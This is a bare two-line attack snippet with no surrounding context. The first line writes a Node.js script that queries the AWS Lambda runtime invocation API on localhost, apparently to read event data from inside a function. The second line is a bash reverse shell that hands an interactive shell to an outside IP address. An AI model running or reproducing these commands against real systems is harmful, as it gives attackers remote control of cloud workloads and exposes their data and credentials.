echo "require('net').connect({port:9001,host:'127.0.0.1'},s=>s.write('GET /2018-06-01/runtime/invocation/next HTTP/1.1\r\nHost: 127.0.0.1:9001\r\n\r\n')).on('data',d=>console.log(d+''));" > client.js
bash -i >& /dev/tcp/3.95.20.82/4001 0>&1;
